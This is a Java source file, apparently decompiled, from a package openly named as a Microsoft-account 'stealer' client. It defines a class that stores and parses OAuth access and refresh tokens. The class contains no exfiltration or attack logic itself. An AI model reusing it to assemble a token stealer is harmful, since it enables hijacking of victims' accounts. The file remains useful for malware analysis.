package dev.neko.nekoclient.api.stealer.msa.auth.credentials;

import com.eclipsesource.json.JsonObject;
import dev.neko.nekoclient.api.stealer.msa.auth.ClientType;

public class MicrosoftCredentials {
   private final String userId;
   private final String accessToken;
   private final ClientType clientType;
   private final long accessTokenExpiration;
   private final String refreshToken;
   private final long refreshTokenExpiration;

   public MicrosoftCredentials(
      String userId, String accessToken, ClientType clientType, long accessTokenExpiration, String refreshToken, long refreshTokenExpiration
   ) {
      this.userId = userId;
      this.accessToken = accessToken;
      this.clientType = clientType;
      this.accessTokenExpiration = accessTokenExpiration;
      this.refreshToken = refreshToken;
      this.refreshTokenExpiration = refreshTokenExpiration;
   }

   public final String getAccessToken() {
      return this.accessToken;
   }

   public final String getRefreshToken() {
      return this.refreshToken;
   }

   public final long getRefreshTokenExpiration() {
      return this.refreshTokenExpiration;
   }

   public final long getAccessTokenExpiration() {
      return this.accessTokenExpiration;
   }

   public final String getUserId() {
      return this.userId;
   }

   public static MicrosoftCredentials parseResponse(JsonObject json, ClientType clientType) {
      return new MicrosoftCredentials(
         json.get("user_id").asString(),
         json.get("access_token").asString(),
         clientType,
         System.currentTimeMillis() + json.get("expires_in").asLong() * 1000L,
         json.get("refresh_token").asString(),
         System.currentTimeMillis() + 1209600000L
      );
   }

   public final ClientType getClientType() {
      return this.clientType;
   }
}
